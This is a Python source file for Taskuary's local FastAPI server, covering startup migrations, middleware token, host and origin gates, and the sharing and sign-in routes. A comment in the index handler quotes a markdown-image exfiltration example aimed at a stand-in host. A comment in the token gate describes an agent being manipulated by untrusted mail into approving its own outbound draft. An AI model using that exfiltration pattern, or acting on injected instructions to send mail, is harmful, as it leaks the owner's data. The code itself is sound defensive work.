"""The local HTTP API + built-in minimal web UI. Localhost-only by default; set
[server].token in config to require an X-Taskuary-Token header (for LAN/self-hosting).
"""
import asyncio, collections, contextlib, copy, json, re, secrets, sys, threading, time, weakref
import requests
from starlette.concurrency import run_in_threadpool
from contextlib import asynccontextmanager
from datetime import datetime
from pathlib import Path
from fastapi import BackgroundTasks, FastAPI, HTTPException, Request, WebSocket, WebSocketDisconnect
from fastapi.responses import FileResponse, HTMLResponse, JSONResponse, Response, StreamingResponse
from pydantic import BaseModel

from . import kinds as task_kinds
from . import buttons, config, failures, words
from . import store as store_mod
from .store import SQLiteStore, is_goal, task_ref
from .ingest import ingest_message, split_message, task_from_message
from .reports import (PLANNED, REGISTRY, note_app_up, render_report, resolve_cfg, run_due_reports, run_one)
from . import agents as hub_agents
from . import cli_connections, pathcache
from . import blackboard
from . import taskstate
from . import search
from . import guard
from . import policy as policy_engine
from . import reshape
from . import terminal as hub_term
from .wrapup import PAUSE_MARKER, REPORTS, pause_note, reply_target, wrap as end_task
from . import aisetup, assistant, demo, deps, learn, learnedgraph, operations, outbound, playbooks, rank, responder, waitroom
from . import live as live_bus
from . import processing_all

# whatever the owner's Install button added lives beside their data, not in the build - and it has
# to be importable BEFORE any card reaches for it (deps.py)
deps.use_packages()
cfg = config.load()
store = SQLiteStore(config.db_path())
# The profiles Taskuary ships, added to the CONFIG before the loop below copies it into the database - so they appear on
# the Agents page, and a restart never rewrites one the owner has changed (seed_profiles skips any name already there).
try:
    from loguru import logger as _log                    # loguru is not bound at module scope yet here
    _added = hub_agents.seed_profiles(cfg)
    _split_cli = cli_connections.migrate(cfg)
    if _split_cli:
        import shutil
        _config_file = config.home() / 'config.toml'
        _backup_file = config.home() / 'config.before-cli-connections.toml'
        if _config_file.exists() and not _backup_file.exists(): shutil.copy2(_config_file, _backup_file)
    # a profile is instructions on any brain: its own CLI leaves it, and the shipped coding profile takes the name `coding` (2026-10-15)
    _config_file = config.home() / 'config.toml'
    _backup_file = config.home() / 'config.before-profiles-on-brains.toml'
    if _config_file.exists() and not _backup_file.exists() and 'provider' in _config_file.read_text(encoding='utf-8'):
        import shutil; shutil.copy2(_config_file, _backup_file)
    _layered = hub_agents.layer_profiles(cfg, store)
    if _added or _split_cli or _layered:
        config.save(cfg)
    if _layered: _log.info('profiles run on the brain their work uses: their own CLI is gone, and the coding profile is `coding`')
    if _added:
        _log.info(f"added the shipped agent profiles: {', '.join(_added)}")
except Exception as _e:
    from loguru import logger as _log
    _log.warning(f'could not seed the shipped agent profiles: {_e}')
cli_connections.sync(cfg, store)
try:
    # tasks routed to a CLI back when naming a worker named a brain (the 2026-09-16 spec)
    # name the brain this install is already running, once - the line that moves it onto the
    # brain layer, and onto exactly what it ran yesterday
    # first: a brain an older start saved FOR the person that does not run here goes, so the adoption below picks a ready one
    hub_agents.heal_brains(store)
    if hub_agents.adopt_brain_setting(store):
        from loguru import logger as _log
        _log.info(f"the brain layer is on: default_brain = {store.get_setting('default_brain')}")
    _repaired = hub_agents.repair_role_assignees(store)
    if _repaired:
        from loguru import logger as _log
        _log.info(f'corrected {_repaired} task(s) routed to a CLI rather than to a role')
except Exception as _e:
    from loguru import logger as _log
    _log.warning(f'could not correct routed roles: {_e}')
# AN INSTALLED CLI IS NOT A CONNECTED ONE: startup used to connect every known CLI it found on the machine (adopt_installed),
# so a CLI the owner never chose showed up connected and in the pickers (the owner, 2026-10-06: "don't assume if cli
# installed to be used.. don't automatically connect them"). Set it up on its card connects it.
try:
    # one coding profile, one CODING.md: the per-CLI coding clones an older setup minted go
    _dropped = hub_agents.drop_cli_clones(cfg, store)
    if _dropped:
        config.save(cfg)
        from loguru import logger as _log
        _log.info(f"one coding profile for every CLI: dropped the coding clones {', '.join(_dropped)}")
except Exception as _e:
    from loguru import logger as _log
    _log.warning(f'could not drop the per-CLI coding clones: {_e}')
# A relaunch opens a NEW chat (retire_dock + funnel.reset_walk) - but not in front of the window. It ran inside the lifespan,
# which uvicorn will not accept a connection until it yields: 629 ms the first call, up to 1,061 ms on the owner's machine
# (2.5-3.5 s on a copy of that store, cold), every launch, with the window saying "can't connect". So it runs on a thread,
# and everything that would see the OLD walk waits for it: every /api request (walk_gate), the four clocks and the catch-up.
_WALK_READY = threading.Event(); _WALK_READY.set()      # set = no reset pending: a test app without a lifespan never waits
_WALK_THREAD = [None]
WALK_WAIT = 15                   # a reset that hangs (a locked store) must not hold the app shut for ever; it logs and lets go


def _new_walk():
    try:
        from . import funnel as _f
        from .general import retire_dock
        if retire_dock(store, ACTOR) is not None: _f.reset_walk(store)
    except Exception as e: logger.warning(f'assistant dock retire failed: {e}')
    finally: _WALK_READY.set()


def _start_new_walk():
    _WALK_READY.clear()
    _WALK_THREAD[0] = t = threading.Thread(target=_new_walk, daemon=True, name='taskuary-new-walk')
    t.start()
    return t


def _walk_settled(timeout: float = WALK_WAIT) -> bool:
    """Wait until the launch's new walk is in place - free once it is (one is_set check)."""
    if _WALK_READY.is_set() or _WALK_READY.wait(timeout): return True
    logger.warning(f'the new chat was not ready after {timeout:.0f}s - going on without it'); return False


@asynccontextmanager
async def _lifespan(_app):
    live_bus.bind(asyncio.get_running_loop())
    # ONE LIVE TASKUARY PER DATA FOLDER (instance.py): every way in - the CLI, the desktop, --server-only - comes through here
    from . import instance, hooks as _hooks
    if not instance.claim(_hooks.base_url()):
        at = instance.holder().get('url')
        raise RuntimeError(f"another Taskuary is already running on {config.home()}{f' at {at}' if at else ''} - open that one, or quit it first")
    is_demo = demo.enabled()
    if not is_demo:
        # Capture historical read results before startup catch-up, worker repair,
        # or New chat can change the inputs. Schema construction alone never cuts over.
        from .processing_startup import initialize
        initialize(store, live_state=[])
        from . import counsel as _counsel
        try: logger.info(f"COUNSEL migration: {_counsel.migrate(store)}")
        except Exception as e: logger.warning(f'COUNSEL migration skipped: {e}')
        # Preserve the owner's existing opt-out before bridges, catch-up, or drain
        # admission can ingest anything. Failure must not enable unattended work.
        store.upgrade_auto_start()
        from . import selfclose as _selfclose
        try: _selfclose.settle_legacy(store)          # 'ask' was a second mode that no longer differs
        except Exception as e: logger.warning(f'self-close setting upgrade skipped: {e}')
        from . import firstrun as _firstrun
        try: _firstrun.settle_existing(store)         # a working install is not sent back into setup by the new Finish button
        except Exception as e: logger.warning(f'first-run finish flag not settled: {e}')
        try: _firstrun.offer_about(store)             # ...but one that never answered About your work opens on it, once
        except Exception as e: logger.warning(f'About your work not offered: {e}')
        try: playbooks.purge()                        # Recently deleted keeps a playbook KEEP_DAYS, then it goes for good
        except Exception as e: logger.warning(f'deleted playbooks not purged: {e}')
        try:                                          # Recently deleted keeps a report, a rule or a profile KEEP_DAYS, then it goes for good
            from . import recentlydeleted; recentlydeleted.purge(store)
        except Exception as e: logger.warning(f'Recently deleted not purged: {e}')
    else:
        # THE DEMO WORLD IS A FINISHED INSTALL: the settle above never runs for it, so its flag stayed unset and read as "not finished" -
        # every demo, and every browser test in CI, opened on setup instead of the day (2026-10-15)
        from . import firstrun as _firstrun
        store.set_setting(_firstrun.DISMISSED, '1', 'demo')
    if not _open_drain_workers(store):
        raise RuntimeError('previous triage drain still owns this store')
    # the demo builds its world and puts agents on the board BEFORE anything else runs - and
    # never polls, never bridges, never catches up on a mailbox that does not exist
    if is_demo:
        try:
            demo.seed(store)
            demo.start_sessions(store)
            # ...and the demo's rail is built the way a real install's is (processing_unread), not the legacy funnel:
            # a goal is one row only there (spec 2026-10-12), and the demo is where the owner looks at the product
            from .processing_startup import initialize
            initialize(store, live_state=[])
        except Exception as e: logger.warning(f'demo seed failed: {e}')
        try:
            async with processing_all.membership_lifecycle(store):
                yield
        finally: instance.release()
        return
    # No interactive or headless worker survives into this process. Repair any persisted
    # in-progress/running flags before the Board and funnel get their first read.
    hub_term.recover_after_restart(store)
    # ...and a batch whose close waited on a turn the restart ended (batch.TAG) closes now, its report from the saved transcript
    from . import batch as _batch
    try: _batch.recover_later(store)
    except Exception as e: logger.warning(f'pending batch closes not recovered: {e}')
    # ...and a session's write-up the restart cut short (writeup.py) is finished from the harvest it saved - and its close made
    from . import writeup as _writeup
    try: _writeup.resume(store)
    except Exception as e: logger.warning(f'interrupted write-ups not resumed: {e}')
    from . import wabridge
    try:
        wabridge.start_configured(store)      # the launch grace is spent by the first poll (wabridge.ready), never here
    except Exception as e: logger.warning(f'wa bridge startup failed: {e}')
    try:                                      # Codex's hooks write a spool, not a request (hooks.py): read it
        from . import hooks as _hooks
        _hooks.start_codex_spool()
    except Exception as e: logger.warning(f'codex hook spool not started: {e}')
    try:                           # reminders and due days come due on start, before any mail is read (remind.tick)
        from . import remind
        remind.tick(store)
    except Exception as e: logger.warning(f'reminders on start skipped: {e}')
    _start_new_walk()              # a relaunch opens a NEW chat rather than resuming the last one - off the window's path
    catch_up_on_startup()          # defined below; resolved when the app actually starts
    try:                           # archived chats past their keep-days go on the app's own clock (PW-158), never on a history read
        from . import retention
        retention.tick(store)
    except Exception as e: logger.warning(f'chat retention skipped: {e}')
    try:                           # ...and the WhatsApp bridge's own log, which loguru never sees
        from . import wabridge
        wabridge.trim_log(store)
    except Exception as e: logger.warning(f'whatsapp log trim skipped: {e}')
    _heal_owner_docs()
    _refresh_soul_connections()
    learn.migrate(store)           # one section per subject, once (2026-10-25) - before anything else writes the doc
    try:                           # ...and the old four priorities as the new three, once (2026-10-25)
        if (moved := store.migrate_priorities()): logger.info(f'priorities renamed to regular / important / urgent: {moved}')
        from . import dashboards                                   # ...and a saved dashboard's cuts on them
        if (n := dashboards.migrate_priorities(store)): logger.info(f'{n} dashboard(s) now cut on regular / important / urgent')
    except Exception as e: logger.warning(f'priority rename skipped: {e}')
    learn.note_verdicts(store)     # the evidence block in LEARNED.md tracks the verdict table
    try: blackboard.schedule_due(store)   # a retry that was backing off when the app closed is re-armed, not reset (PW-085)
    except Exception as e: logger.warning(f'retry scheduling skipped: {e}')
    try:                           # historical triage failures stored as filed become retriable errors, once (PW-040)
        n = store.upgrade_triage_failures()
        if n: logger.info(f'{n} historical triage failure(s) now show as errors with a retry')
    except Exception as e: logger.warning(f'triage-failure upgrade skipped: {e}')
    note_app_up(store, start=True)   # this launch, so a shut-overnight gap is not read as a dead scheduler
    threading.Thread(target=poll_forever, daemon=True).start()
    threading.Thread(target=reports_forever, daemon=True).start()   # the reports' own clock - never the mail's
    threading.Thread(target=quick_forever, daemon=True).start()   # the chat clock, never behind a slow sync
    threading.Thread(target=doorway_forever, daemon=True).start()  # the assistant chat, answered as fast as it is typed
    waitroom.watch(store)          # notes queued for a working agent land when it stops
    from . import reasonnet
    reasonnet.watch(store)         # Reason Network: held messages and replies, while its card is on (reasonnet.py)
    from . import asks
    asks.watch(store)              # what the owner asked for is said back at its door when it moves (asks.py)
    from . import msauth
    msauth.on_rotate = lambda cid, rt: store.save_connector({'ConnectorId': cid, 'Secret': rt}, 'msauth')   # a rotated Microsoft refresh token outlives a restart
    from . import chatgptauth
    chatgptauth.on_rotate = lambda cid, rt: store.save_connector({'ConnectorId': cid, 'Secret': rt}, 'chatgptauth')   # ...and a ChatGPT one
    from . import sharing   # imported here, before the first request: imported on the start's own thread it raced the first requests (a card's Enable read back Off)
    threading.Thread(target=share_start, name='taskuary-share-start', daemon=True).start()   # links on: their own port
    from . import awake
    awake.start(store)             # the computer stays awake while an agent or a workflow runs, and only then (awake.py)
    try:
        async with processing_all.membership_lifecycle(store):
            yield
    finally:
        t = _WALK_THREAD[0]
        if t is not None and t.is_alive(): t.join(WALK_WAIT)   # never close the store under it
        _WALK_READY.set()
        awake.stop()               # ...and sleep is allowed again once nothing here can run
        _close_permits()           # a permit holds for days: released, its thread returns and the process can exit
        if not _close_drain_workers(timeout=DRAIN_WAIT, target_store=store):
            logger.warning('triage drain still stopping during shutdown')
        # Both watched PTYs and one-shot CLI brains are children of this process. An orderly
        # Taskuary close owns them: leaving them alive creates invisible Claude/Codex sessions
        # that can keep consuming resources after there is no UI capable of reaching them.
        hub_term.shutdown_sessions()
        hub_agents.shutdown_cli_children()
        # ...and a chat that was promised a follow-up hears what the close did to it, instead of nothing (B3, 2026-10-11)
        from . import remote_assistant
        try: remote_assistant.promises_closing(store)
        except Exception as e: logger.warning(f'closing: the phone promises were not told - {e}')
        try: sharing.stop_listener()   # the share port closes with the app
        except Exception as e: logger.warning(f'closing: the share listener did not stop - {e}')
        instance.release()           # the next start in this process (a test, a restart) takes the folder again

app = FastAPI(title='Taskuary', docs_url='/api/docs', lifespan=_lifespan)
ACTOR = 'owner'
# Attaching a terminal repaints it: the rendered replay, then the one-column wiggle's full redraw.
# That output is ours, not the agent's, so idle() must not count it (Term.quiet_for).
ATTACH_QUIET = 10


from loguru import logger
import time as _time
QUIET_GETS = {'/api/ingest/status'}     # polled GETs that are not logged when they succeed (request_log)
SLOW_REQUEST = 5.0                      # seconds: a request this slow is logged at INFO with its store.lock wait (request_log)

@app.middleware('http')
async def walk_gate(request: Request, call_next):
    # innermost (registered first): a refused request never waits. /api/health is the desktop's "is it up" pulse
    if not _WALK_READY.is_set() and request.url.path.startswith('/api') and request.url.path != '/api/health':
        await asyncio.to_thread(_walk_settled)    # the first rail, chat or pile read sees the new walk, never yesterday's
    return await call_next(request)

PRESENCE_SKIP = {'/api/concierge/arrive', '/api/health'}     # arrive keeps its own book: its gap is the greeting's (welcome.arrive)

@app.middleware('http')
async def owner_presence(request: Request, call_next):
    # WHAT THE OWNER DID IS WHERE THEY WERE: every press and send is one, so "while you were away" counts from a real silence
    # (welcome.touch) and not from the morning's gap all day. GETs are the page's own polls, an agent's call is not the owner.
    resp = await call_next(request)
    p = request.url.path
    pressed = request.method != 'GET' and p.startswith('/api') and p not in PRESENCE_SKIP and resp.status_code < 400
    if pressed and guard.scope_of(cfg['server'], request.headers) == guard.OWNER:
        from . import welcome
        # never waits: not on the thread pool (to_thread hung under a patched threading.Thread), nor on store.lock while a sync
        # holds it - kept in memory, written when the lock is free (welcome.pressed)
        try: welcome.pressed(store)
        except Exception as e: logger.debug(f'presence not kept - {e}')
    return resp

@app.middleware('http')
async def request_log(request: Request, call_next):
    t0 = _time.time()
    try:
        # what this request spent queued on store.lock, as against running - the context rides into the thread pool with it
        with store_mod.lock_wait_meter() as waited: resp = await call_next(request)
    except Exception as e:
        # WHAT BROKE, IN THE PAGE. The trace goes to taskuary.log as it always has, but the browser
        # got a bare 500 with no body - so the Timeline sat on "Loading timeline" for ever and the
        # assistant said "Request failed with status code 500" and nothing else, on a machine whose
        # owner had no reason to know a log file existed (the owner, 2026-09-22: "it's not showing
        # the error anywhere"). One line of it here, and where the rest of it is.
        logger.exception(f'{request.method} {request.url.path} crashed')
        if not request.url.path.startswith('/api'): raise
        from .config import home
        return JSONResponse({'detail': f'{type(e).__name__}: {str(e)[:300] or "no message"}',
                             'where': f'{request.method} {request.url.path}',
                             'log': str(home() / 'taskuary.log'), 'code': 'crashed'}, status_code=500)
    # ...except a status poll that answered: the page asks every second or so, and those lines were three
    # quarters of taskuary.log - the 5 MB rotation then kept a day and a half of anything else (P13)
    if request.url.path.startswith('/api') and not (request.method == 'GET' and request.url.path in QUIET_GETS and resp.status_code < 300):
        took = _time.time() - t0
        # A SLOW ONE SAYS WHERE ITS TIME WENT (2026-10-23): waited on the store's lock, or ran (its own work, the thread pool, the
        # network). The freezes left only "20 requests finished in the same second"; this line, with store.lock's own warning
        # naming the holder, is what tells a held store from a slow handler next time.
        why = f' - store.lock wait {waited[0]:.1f}s, ran {max(0.0, took - waited[0]):.1f}s' if took >= SLOW_REQUEST else ''
        (logger.info if took >= SLOW_REQUEST else logger.debug)(
            f'{request.method} {request.url.path} -> {resp.status_code} ({int(took * 1000)}ms){why}')
    return resp

# the redirects back from a provider's sign-in: no header can ride on one, so each proves itself with the one-time state it was issued
OAUTH_RETURNS = ('/api/quickbooks/callback', '/api/zoho/callback', '/api/linkedin/callback', '/api/google/files/callback')

@app.middleware('http')
async def token_gate(request: Request, call_next):
    # /api/health is the Docker / load-balancer pulse - it must work without the LAN token
    if request.url.path == '/api/health':
        return await call_next(request)
    # the demo is the real app with every door to the outside world shut, and it is shut HERE:
    # over the method and the path, before a handler exists to be trusted (demo.py)
    if demo.enabled():
        why = demo.refuse(request.method, request.url.path)
        if why:
            # ...and the refused press is an act on its item, so the Advisor reads it again as refused (demo.refused)
            try: demo.refused(store, request.url.path, why)
            except Exception as e: logger.debug(f'demo: refusal of {request.url.path} not kept - {e}')
            return JSONResponse({'detail': why, 'demo': True}, status_code=403)
    elif not guard.host_ok(request.headers.get('host'), cfg['server']):
        # EVERY path, not just /api: the page itself carries the owner token, so a name we do not
        # answer to must not be able to load it either (guard.host_ok on DNS rebinding)
        logger.warning(f'refused Host {request.headers.get("host")!r} - not a name this server answers to')
        return JSONResponse({'detail': f'this server does not answer to the name {request.headers.get("host")!r}. '
                                       'If you reach Taskuary by a hostname, add it to allowed_hosts under '
                                       '[server] in config.toml.'}, status_code=403)
    # ...and a request some OTHER page told the browser to make is not the owner asking, whatever
    # token the browser had lying around. The Intuit callback is the one cross-site arrival by
    # design - a redirect from their site, proving itself with the one-time state it was issued.
    elif (request.url.path.startswith('/api') and request.url.path not in OAUTH_RETURNS
          and not guard.origin_ok(request.headers)):
        logger.warning(f'refused {request.method} {request.url.path} from origin {request.headers.get("origin")!r}')
        return JSONResponse({'detail': 'this request came from another site. Taskuary answers its own '
                                       'pages only.'}, status_code=403)
    tok = cfg['server'].get('token')
    presented = request.headers.get('X-Taskuary-Token')
    if tok and request.url.path.startswith('/api') and not guard.token_matches(presented, tok, cfg['server'].get('agent_token')) \
            and guard.stranger_tid(cfg['server'], presented) is None:
        # an <img src> cannot carry a header, so attachment READS take the token in the query
        # string - the same concession websockets already needed
        # ...and an OAuth callback is a redirect from the provider's site: no header can ride on it.
        # It proves itself with the one-time state it was issued (quickbooks_authorize), not the token.
        file_read = request.url.path.startswith(('/api/attachments/', '/api/task-artifacts/', '/api/task-outputs/'))
        if not (file_read and guard.token_matches(request.query_params.get('token'), tok)) \
                and request.url.path not in OAUTH_RETURNS:
            # In JSON, like every other refusal: an HTML body left `detail` undefined, so a tab that
            # was open across a token change answered every click with whichever screen's generic
            # "that did not work" fallback happened to be nearest (2026-09-10 audit).
            # ...and not "reload": a reload no longer re-seeds the token (R29). The page drops the stale one on this code.
            return JSONResponse({'detail': 'This page is signed in with an out-of-date token. Open Taskuary from its app, or run `taskuary --link`.',
                                 'code': 'unauthorized'}, status_code=401)
    # WHAT AN AGENT MAY NOT DO, before a handler exists to be talked round (guard.py). A session
    # runs with the agent token in its environment, and the routes that SEND - approve a reply,
    # hand work to a person, start an outbound message - are refused to it here, in code. Not in
    # SOUL.md, not in a setting: an instruction sitting in the same context as the untrusted mail
    # is not a control, and a model that has been talked into "they want this sent now" would
    # otherwise find this API and approve its own draft. Writes are an ALLOW list (guard.AGENT_WRITES):
    # a deny list left /api/operations running review.approve for it under a path nobody had named.
    scope = guard.scope_of(cfg['server'], request.headers)
    if scope == guard.AGENT:
        why = guard.denied(request.method, request.url.path)
        if why:
            logger.warning(f'agent refused {request.method} {request.url.path} - {why}')
            return JSONResponse({'detail': f'agents cannot do this: {why}. Ask the owner - it is '
                                           'their button, and no instruction in a message changes that.'},
                                status_code=403)
    # ...and a stranger's session (R28) holds a token bound to its own task: that task, its files, its doors - no feed,
    # no other mail, no settings, no neighbour
    elif scope == guard.STRANGER:
        tid = guard.stranger_tid(cfg['server'], presented)
        why = await run_in_threadpool(guard.stranger_denied, request.method, request.url.path, request.query_params, tid, _stranger_file_task)   # it may ask the store
        if why:
            logger.warning(f'stranger session on task {tid} refused {request.method} {request.url.path} - {why}')
            return JSONResponse({'detail': f'agents cannot do this: {why}.'}, status_code=403)
    return await call_next(request)


def _stranger_file_task(kind: str, aid: int):
    "Which task an attachment or a session artifact belongs to, for the stranger gate (guard.stranger_denied)."
    if kind == 'artifact': return (store.get_task_artifact(aid) or {}).get('TaskId')
    mid = (store.get_attachment(aid) or {}).get('MessageId')
    return (store.get_message(mid) or {}).get('TaskId') if mid else None


# pydantic v2: `str = None` is NOT optional - an explicit JSON null then 422s the request
# (the UI sends e.g. final_text: null on reject). Every nullable field must say `| None`.
class TaskBody(BaseModel):
    Title: str | None = None; Summary: str | None = None; Kind: str | None = None
    Priority: str | None = None; Status: str | None = None; Tags: str | None = None
    Assignee: str | None = None; DoneWhen: str | None = None; DueAt: str | None = None; ParentId: int | None = None
class ReadAskBody(BaseModel): goal: bool = False
class MsgBody(BaseModel):
    external_id: str | None = None; channel: str = 'api'; subject: str | None = None
    body: str | None = None; from_name: str | None = None; from_email: str | None = None
    conversation_id: str | None = None; sent_at: str | None = None
    source_link: str | None = None; source_name: str | None = None
class TextBody(BaseModel): body: str
class AssistantSessionBody(BaseModel):
    connector_id: int | None = None; pick: str | None = None; model: str | None = None
class AssistantMessageBody(AssistantSessionBody):
    text: str; attachments: list[str] = []
class DecideBody(BaseModel):
    verb: str; final_text: str | None = None; note: str | None = None
    cc: list[str] | None = None      # loop somebody in on this answer (email only)
    reply_text: str | None = None    # on a close-out: the task's pending reply, sent once the merge/close succeeded
    anyway: bool = False             # Send anyway: past a delivery nobody can confirm (verdicts._deliver_review)
class CodeBody(BaseModel):
    repo: str | None = None; agent: str | None = None
    model: str | None = None; instruction: str | None = None
    brain: str | None = None         # WHICH CLI - continue_task read it, but nothing could ever send it
class DocBody(BaseModel): content: str
class SettingBody(BaseModel): name: str; value: str
class SourceBody(BaseModel):
    SourceId: int | None = None; ConnectorId: int | None = None; Channel: str | None = None
    Address: str | None = None; ConfigJson: str | None = None; Active: bool | None = None
class DispatchBody(BaseModel):
    # `agent` is the ROLE that works it; `brain` is WHICH CLI runs it. Two questions, and
    # answering both with one name is what sent TQ-0588's coding work to Copilot. `pick` is the
    # same question in the GENERAL namespace ('cli:<profile>' / 'connector:<id>'), which is what a
    # general session resolves and saves; a cli_connections key would mean nothing to it.
    agent: str | None = None; brain: str | None = None; pick: str | None = None
    instruction: str | None = None; model: str | None = None
    standing: bool = False          # a REPORT run only: learn this as a rule for every run, not a one-off use of this run
    # The button says "Send to agent".  The task's Kind remains authoritative once a task
    # exists; this hint is only how an unpromoted message says which kind of task to create.
    kind: str | None = None
    # A GOAL'S PRESS STARTS ITS STEP: Send to agent on a goal dispatches the step's own task, and a start that failed was left on the
    # step - a task nobody had pressed - while the goal's card showed the error under a line that never moved (the matrix's verify,
    # 2026-10-20). `via` is the goal the press was made on; a failed start is left there, where it was pressed and is read.
    via: int | None = None
    # the Assistant's "Wrote it into New" line whose card this press is: said again as what it started (concierge.said_started)
    said: int | None = None
class PolicyBody(BaseModel):
    PolicyId: int | None = None; Name: str | None = None; Kind: str | None = None
    Pattern: str | None = None; Action: str | None = None; Reason: str | None = None
    SortOrder: int | None = None; Active: bool | None = None
    Mailbox: str | None = None       # the mailboxes it is for, '|'-separated; '' is every mailbox (policy.on_mailbox)
class MemoryBody(BaseModel):
    note: str; scope: str = 'global'; scope_key: str | None = None
    source: str = 'manual'          # 'writing' = an instruction about how to write, read by the drafter only (PW-060)
class MemoryToggle(BaseModel): active: bool
class ConnectorBody(BaseModel):
    ConnectorId: int | None = None; Type: str | None = None; Name: str | None = None
    ConfigJson: str | None = None; Secret: str | None = None; Active: bool | None = None
    Roles: str | None = None                       # csv of trigger,report,tool - see store.ROLES
    Scope: str | None = None                       # read | write | admin - see scopes.SCOPES
class AiSetupBody(BaseModel):
    guide: list[str] = []; fields: list = []; secret_label: str | None = None   # the card's Guide + form, as the UI has them
    agent_steps: list[str] = []                                                  # the card's Agent tab: steps written FOR the agent
    agent: str | None = None; model: str | None = None


_web_root = Path(__file__).parent / 'web'


def _index_response(index_file: Path, seed: bool = False):
    try:
        html = index_file.read_text(encoding='utf-8')
    except FileNotFoundError:
        # Vite empties its output directory before replacing a production bundle. A browser can
        # arrive in that small gap while the Python server stays live; make it a self-healing 503,
        # not an application traceback. This also gives a useful response for an incomplete install.
        html = '''<!doctype html><html><head><meta charset="utf-8">
<meta http-equiv="refresh" content="1"><title>Taskuary is updating</title></head>
<body style="font:14px system-ui;margin:4rem;color:#4d4a43">Taskuary is updating&hellip;</body></html>'''
        return HTMLResponse(html, status_code=503, headers={
            'Cache-Control': 'no-store, must-revalidate', 'Retry-After': '1',
            'X-Content-Type-Options': 'nosniff'})
    return HTMLResponse(_seed_token(html, seed), headers={
        'Cache-Control': 'no-store, must-revalidate',
        'X-Content-Type-Options': 'nosniff',
        'Referrer-Policy': 'same-origin',
        # A picture in rendered markdown is a request the owner never chose to make, and agent notes,
        # reports and chat all render markdown: `![](https://x.example/?d=<data>)` carried data out
        # when the card opened (audit 2026-10-14). Pictures only - no default-src, so nothing else moves.
        'Content-Security-Policy': "img-src 'self' data: blob:",
        'X-Frame-Options': 'DENY'})


def _seed_token(html: str, seed: bool = False) -> str:
    """The page the SERVER hands out carries the owner token - but only when `seed`: the page was opened with a
    one-time launch key (launchkey.py, R29). That is what makes a mandatory token cost the owner nothing: no other
    site can read this HTML (same-origin, and token_gate checks Host first), and the app has its credential before
    the bundle's first fetch. Unkeyed, any process on this machine could read it - a restricted session's shell, its
    agent browser - so an unkeyed page carries none, and says so (taskuary-unlinked) for a tab that has none stored.
    The key leaves the address bar either way: a reload must not look like a second use."""
    tok = cfg['server'].get('token')
    if not tok or '</head>' not in html: return html
    strip = 'try{var u=new URL(location.href);if(u.searchParams.has("k")){u.searchParams.delete("k");history.replaceState(history.state,"",u)}}catch(e){}'
    head = (f'<script>try{{localStorage.setItem("taskuary_token",{json.dumps(tok)})}}catch(e){{}}{strip}</script>' if seed
            else f'<meta name="taskuary-unlinked" content="1"><script>{strip}</script>')
    return html.replace('</head>', head + '</head>', 1)


@app.get('/', response_class=HTMLResponse)
def index(k: str = ''):
    """The one file that must NEVER be cached. Every asset under /assets carries a content hash
    in its name, so those can be held forever - but index.html is what NAMES them, and a cached
    copy points a fresh install at a bundle that is no longer there (or worse, one that is). An
    old index.html is how a fixed crash keeps crashing: the fix shipped, the browser kept asking
    for yesterday's JS, and the stack trace named a file the repo had already replaced."""
    from . import launchkey
    return _index_response(_web_root / 'index.html', seed=launchkey.redeem(k) if k else False)


@app.post('/api/launch-key')
def launch_key(request: Request):
    """A one-time key for `/?k=` (launchkey.py): the CLI asks the running instance for one to open the owner's browser
    with, and `taskuary --link` prints one. The owner's alone - an agent or a stranger's session holding one could
    read the owner token out of the page."""
    from . import launchkey
    if guard.scope_of(cfg['server'], request.headers) != guard.OWNER: raise HTTPException(403, "a launch key is the owner's")
    return {'key': launchkey.mint()}


# ── SHARE A RESULT (sharing.py): the menu's ways, the press, the links still open, and the one page outside the token ─────────
class ShareBody(BaseModel):
    how: str
    kind: str | None = None; title: str | None = None; text: str | None = None; html: str | None = None
    data: list | None = None; task: int | None = None; message: int | None = None
    to: list[str] | None = None; days: int | None = None


@app.get('/api/shares/ways')
def share_ways():
    from . import sharing
    return sharing.ways(store, cfg['server'])


@app.get('/api/shares')
def share_links():
    from . import sharing
    return {'data': sharing.active(store)}


@app.post('/api/shares')
def share_result(body: ShareBody, request: Request):
    """One way out for one result - a draft, a link, an upload. The owner's alone (guard.DENIED keeps agents off it too)."""
    from . import sharing
    _owner_only(request, "sharing a result is the owner's")
    try: return sharing.share(store, cfg['server'], body.model_dump(), ACTOR)
    except LookupError as e: raise HTTPException(404, str(e))
    except (ValueError, PermissionError) as e: raise HTTPException(422, str(e))
    except Exception as e:
        logger.warning(f'share by {body.how} failed: {e}')
        raise HTTPException(502, f'it did not go - {str(e)[:300]}')


@app.delete('/api/shares/{sid}')
def share_revoke(sid: int, request: Request):
    from . import sharing
    _owner_only(request, "revoking a link is the owner's")
    if not sharing.revoke(store, sid, ACTOR): raise HTTPException(404, 'no such link, or it was revoked already')
    return {'ok': True}


# ...and the page a link opens is NOT here: this app stays on 127.0.0.1 behind the token. Links are served by sharing.share_app, a second
# server on its own port that knows /share/<token> and nothing else, running only while "Share links on your network" is on.


# ── SIGNING IN FOR THE BROWSER AGENT (signin.py): the fill link, the fill page, and the saved sign-ins. None of it an agent's ──
@app.post('/api/tasks/{task_id}/signin/link')
def signin_link(task_id: int, request: Request, open: int = 0):
    """A one-time fill page for the sign-in this task waits on. Only its hash is kept; the link is shown here, once - or, for the
    desktop app (no browser of its own, as /api/open-url), opened in the default browser and not shown at all."""
    import webbrowser
    from . import hooks, signin
    _owner_only(request, "signing in is the owner's")
    try: out = signin.link(store, task_id)
    except LookupError as e: raise HTTPException(404, str(e))
    if not open: return out
    threading.Thread(target=webbrowser.open, args=(hooks.base_url() + out['url'],), daemon=True).start()
    return {'opened': True, 'site': out['site'], 'minutes': out['minutes']}


@app.get('/api/signins')
def signins(request: Request):
    from . import signin
    _owner_only(request, "the saved sign-ins are the owner's")
    return {'data': signin.listing(store)}


@app.delete('/api/signins/{site}')
def signin_remove(site: str, request: Request):
    from . import signin
    _owner_only(request, "the saved sign-ins are the owner's")
    if not signin.remove(store, site, ACTOR): raise HTTPException(404, 'nothing is saved for that site')
    return {'ok': True}


class SigninKeyBody(BaseModel):
    key: str = ''


# A SAVED SIGN-IN'S AUTHENTICATOR KEY (2026-10-25): kept, or (empty) dropped. Write-only: no route ever reads a key back
@app.post('/api/signins/{site}/code')
def signin_code(site: str, body: SigninKeyBody, request: Request):
    from . import signin
    _owner_only(request, "the saved sign-ins are the owner's")
    try: ok = signin.set_key(store, site, body.key.strip(), ACTOR)
    except ValueError as e: raise HTTPException(400, str(e))
    if not ok: raise HTTPException(404, 'nothing is saved for that site')
    return {'ok': True, 'code': bool(body.key.strip())}


# The fill page sits outside /api on purpose: it is opened as a page, so no header can ride on it - the one-time token in its address
